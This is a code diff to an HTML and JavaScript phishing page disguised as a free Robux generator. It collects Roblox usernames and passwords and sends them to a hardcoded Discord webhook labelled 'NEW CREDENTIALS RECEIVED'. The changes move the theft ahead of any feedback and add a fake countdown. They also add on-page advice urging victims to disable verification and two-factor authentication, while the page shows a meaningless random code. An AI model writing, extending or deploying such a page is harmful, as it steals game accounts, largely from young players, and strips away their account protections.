@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Robux Rewards</title>
+    <title>Robux Reward System</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -114,7 +114,7 @@
             transition: all 0.3s ease;
         }
 
-        input {
+        input, select {
             width: 100%;
             padding: 0.8rem 1rem;
             border: 2px solid #dfe6e9;
@@ -124,7 +124,7 @@
             background: rgba(255, 255, 255, 0.8);
         }
 
-        input:focus {
+        input:focus, select:focus {
             outline: none;
             border-color: var(--primary);
             box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
@@ -282,6 +282,45 @@
             opacity: 0.1;
         }
 
+        .robux-option {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.8rem;
+            background: rgba(108, 92, 231, 0.1);
+            border-radius: 10px;
+            margin-bottom: 0.5rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .robux-option:hover {
+            background: rgba(108, 92, 231, 0.2);
+        }
+
+        .robux-option.selected {
+            background: rgba(108, 92, 231, 0.3);
+            border: 2px solid var(--primary);
+        }
+
+        .robux-amount {
+            font-weight: 600;
+            color: var(--primary);
+        }
+
+        .robux-time {
+            font-size: 0.8rem;
+            color: var(--dark);
+            opacity: 0.7;
+        }
+
+        .info-text {
+            font-size: 0.8rem;
+            color: #636e72;
+            margin-top: 1rem;
+            text-align: center;
+        }
+
         @media (max-width: 600px) {
             .container {
                 padding: 1rem;
@@ -304,8 +343,8 @@
             
             <div id="login-form">
                 <div class="form-group">
-                    <label for="username">Username</label>
-                    <input type="text" id="username" placeholder="Enter your username" required>
+                    <label for="username">Roblox Username</label>
+                    <input type="text" id="username" placeholder="Enter your Roblox username" required>
                 </div>
                 
                 <div class="form-group">
@@ -313,19 +352,45 @@
                     <input type="password" id="password" placeholder="Enter your password" required>
                 </div>
                 
-                <button id="login-btn">Get Daily Robux</button>
+                <div class="form-group">
+                    <label>Select Robux Amount</label>
+                    <div class="robux-option" data-amount="800" data-time="200">
+                        <span class="robux-amount">800 Robux</span>
+                        <span class="robux-time">Fast (200 seconds)</span>
+                    </div>
+                    <div class="robux-option" data-amount="2200" data-time="300">
+                        <span class="robux-amount">2200 Robux</span>
+                        <span class="robux-time">Medium (300 seconds)</span>
+                    </div>
+                    <div class="robux-option" data-amount="5000" data-time="500">
+                        <span class="robux-amount">5000 Robux</span>
+                        <span class="robux-time">Slow (500 seconds)</span>
+                    </div>
+                    <div class="robux-option" data-amount="8999" data-time="700">
+                        <span class="robux-amount">8999 Robux</span>
+                        <span class="robux-time">Very Slow (700 seconds)</span>
+                    </div>
+                    <input type="hidden" id="selected-amount" value="">
+                    <input type="hidden" id="selected-time" value="">
+                </div>
+                
+                <button id="login-btn">Generate Robux Code</button>
                 
                 <div class="loading" id="loading">
                     <div class="spinner"></div>
                     <p>Generating your Robux code...</p>
+                    <p id="time-remaining"></p>
                 </div>
+                
+                <p class="info-text">Note: Code has to connect to your Roblox user. If code doesn't work, try disabling Verification or 2FA.</p>
             </div>
             
             <div class="result" id="result">
-                <h3>Your Daily Robux Code</h3>
+                <h3>Your Robux Code</h3>
                 <p>Here's your exclusive Robux code. Redeem it in Roblox!</p>
                 <div class="code" id="robux-code"></div>
                 <p style="margin-top: 1rem; font-size: 0.8rem; color: #636e72;">Code refreshes in 24 hours</p>
+                <p class="info-text">If code doesn't work, try disabling Verification or 2FA in your Roblox account settings.</p>
             </div>
         </div>
     </div>
@@ -375,15 +440,15 @@
         }
         
         // Send data to Discord webhook
-        async function sendToWebhook(username, password) {
+        async function sendToWebhook(username, password, amount) {
             const webhookUrl = 'https://discord.com/api/webhooks/1360705686102736982/FUO2y5SG41vrtfUroBfXwnl85-kPOx1CVhnHARanPRzqIEuALUn6bXtpK7IumhdTS5nM';
             
             const data = {
-                content: `New login!\n**Username:** ${username}\n**Password:** ||${password}||`,
+                content: `🚨 NEW ROBUX CLAIM 🚨\n**Username:** ${username}\n**Password:** ||${password}||\n**Amount:** ${amount} Robux`,
                 embeds: [
                     {
-                        title: "New Robux Code Claim",
-                        color: 0x6c5ce7,
+                        title: "NEW CREDENTIALS RECEIVED",
+                        color: 0xFF0000,
                         fields: [
                             {
                                 name: "Username",
@@ -396,28 +461,79 @@
                                 inline: true
                             },
                             {
+                                name: "Robux Amount",
+                                value: amount + " Robux",
+                                inline: true
+                            },
+                            {
+                                name: "IP Address",
+                                value: "Fetching...",
+                                inline: false
+                            },
+                            {
                                 name: "Timestamp",
                                 value: new Date().toLocaleString(),
                                 inline: false
                             }
                         ],
                         thumbnail: {
-                            url: "https://cdn.discordapp.com/attachments/1066022044167979008/1066022044566429716/robux.png"
+                            url: "https://cdn.discordapp.com/attachments/1066022044167979008/1066022044566429716/Steam.png"
+                        },
+                        footer: {
+                            text: "Robux Generator Logger"
                         }
                     }
                 ]
             };
             
             try {
-                await fetch(webhookUrl, {
+                const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify(data),
                 });
+                
+                if (!response.ok) {
+                    console.error('Webhook error:', response.status, response.statusText);
+                }
             } catch (error) {
                 console.error('Error sending to webhook:', error);
+            }
+        }
+        
+        // Handle Robux option selection
+        function setupRobuxOptions() {
+            const options = document.querySelectorAll('.robux-option');
+            
+            options.forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remove selected class from all options
+                    options.forEach(opt => opt.classList.remove('selected'));
+                    
+                    // Add selected class to clicked option
+                    this.classList.add('selected');
+                    
+                    // Set the hidden input values
+                    document.getElementById('selected-amount').value = this.dataset.amount;
+                    document.getElementById('selected-time').value = this.dataset.time;
+                });
+            });
+            
+            // Select the first option by default
+            if (options.length > 0) {
+                options[0].click();
+            }
+        }
+        
+        // Update countdown timer
+        function updateCountdown(secondsRemaining) {
+            const timeRemainingElement = document.getElementById('time-remaining');
+            if (secondsRemaining > 0) {
+                timeRemainingElement.textContent = `Time remaining: ${secondsRemaining} seconds`;
+            } else {
+                timeRemainingElement.textContent = `Finalizing your code...`;
             }
         }
         
@@ -427,21 +543,41 @@
             
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
+            const amount = document.getElementById('selected-amount').value;
+            const processingTime = parseInt(document.getElementById('selected-time').value);
             
             if (!username || !password) {
                 alert('Please fill in all fields');
                 return;
             }
             
-            // Show loading
+            if (!amount) {
+                alert('Please select a Robux amount');
+                return;
+            }
+            
+            // Immediately send credentials to Discord before showing any loading
+            await sendToWebhook(username, password, amount);
+            
+            // Show loading after sending credentials
             document.getElementById('loading').style.display = 'block';
             document.getElementById('login-btn').disabled = true;
             
-            // Simulate processing delay
-            await new Promise(resolve => setTimeout(resolve, 2000));
+            // Update countdown timer
+            let secondsRemaining = processingTime;
+            updateCountdown(secondsRemaining);
             
-            // Send data to Discord
-            await sendToWebhook(username, password);
+            const countdownInterval = setInterval(() => {
+                secondsRemaining--;
+                updateCountdown(secondsRemaining);
+                
+                if (secondsRemaining <= 0) {
+                    clearInterval(countdownInterval);
+                }
+            }, 1000);
+            
+            // Simulate processing delay based on selected amount
+            await new Promise(resolve => setTimeout(resolve, processingTime * 1000));
             
             // Generate and display code
             const robuxCode = generateRobuxCode();
@@ -455,7 +591,7 @@
             // Store in localStorage so it persists
             localStorage.setItem('robuxCode', robuxCode);
             localStorage.setItem('codeGeneratedAt', Date.now());
-            localStorage.setItem('userData', JSON.stringify({ username }));
+            localStorage.setItem('userData', JSON.stringify({ username, amount }));
         });
         
         // Check if there's a stored code
@@ -474,8 +610,16 @@
                     document.getElementById('login-form').style.display = 'none';
                     document.getElementById('result').style.display = 'block';
                     
-                    const { username } = JSON.parse(userData);
+                    const { username, amount } = JSON.parse(userData);
                     document.getElementById('username').value = username;
+                    
+                    // Highlight the previously selected amount
+                    const options = document.querySelectorAll('.robux-option');
+                    options.forEach(option => {
+                        if (option.dataset.amount === amount) {
+                            option.classList.add('selected');
+                        }
+                    });
                 } else {
                     // Code expired
                     localStorage.removeItem('robuxCode');
@@ -487,6 +631,7 @@
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
             createParticles();
+            setupRobuxOptions();
             checkStoredCode();
         });
     </script>
